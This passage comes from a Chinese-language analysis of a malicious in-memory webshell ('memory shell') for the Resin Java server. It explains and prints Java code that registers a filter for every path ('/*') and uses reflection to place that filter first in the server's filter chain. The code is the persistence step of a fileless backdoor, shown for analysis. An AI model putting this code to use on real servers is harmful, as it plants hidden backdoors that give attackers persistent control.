`javax.servlet.FilterRegistration.Dynamic` 接口
动态添加的恶意`filter`模块
###  创建相应 filter 路由映射
通过创建 `FilterMapping` 实例, 并设置相对应的路由，这里可以看见恶意样本是对所有的路径进行匹配
相对应的显示调用源码如下
    FilterMapping filterMapping = (FilterMapping)filterMappingcls.newInstance();
    FilterMapping.URLPattern filterMappingUrlpattern = filterMapping.createUrlPattern();
    filterMappingUrlpattern.addText("/*");
    filterMappingUrlpattern.init();
    filterMapping.setFilterName(newFilterStr);
    filterMapping.setServletContext(webapp);
###  调整 filter 顺序
在创建filter 实例，添加 `filterConfigImpl`及相应路由之后，样本路由添加到 `WebApp._filerMapper` 和
`WebApp._loginFilterMapper` 中，`_filerMapper` 及 `_loginFilterMapper` 中存放的是
`ArrayList` 数组，样本通过创建新的 `ArrayList` 并将前序步骤创建的
`filterMapping` 做为首位加入。
    Field fieldWebappFilterMapper = null;
    try {
        fieldWebappFilterMapper = webapp.getClass().getDeclaredField("_filterMapper");
    }catch (NoSuchFieldException Exception){
        fieldWebappFilterMapper = webapp.getClass().getSuperclass().getDeclaredField("_filterMapper");
    }
    fieldWebappFilterMapper.setAccessible(true);
    FilterMapper filtermapper = (FilterMapper) fieldWebappFilterMapper.get(webapp);
    Field fieldFilterMapperFilterMap = filterMappercls.getDeclaredField("_filterMap");
    fieldFilterMapperFilterMap.setAccessible(true);
    ArrayList orginalfilterMappings = (ArrayList) fieldFilterMapperFilterMap.get(filtermapper);
    ArrayList newFilterMappings = new ArrayList(orginalfilterMappings.size() + 1);
    newFilterMappings.add(filterMapping);
    int count = 0;
    while(count < orginalfilterMappings.size()){
        newFilterMappings.add(orginalfilterMappings.get(count));
        ++ count;
    }
    fieldFilterMapperFilterMap.set(filtermapper, newFilterMappings);
    fieldWebappFilterMapper.set(webapp, filtermapper);
调整之后的 _filterMapper
## 完整的 resin 内存马逻辑
提供一份创建完整的 resin 内存马逻辑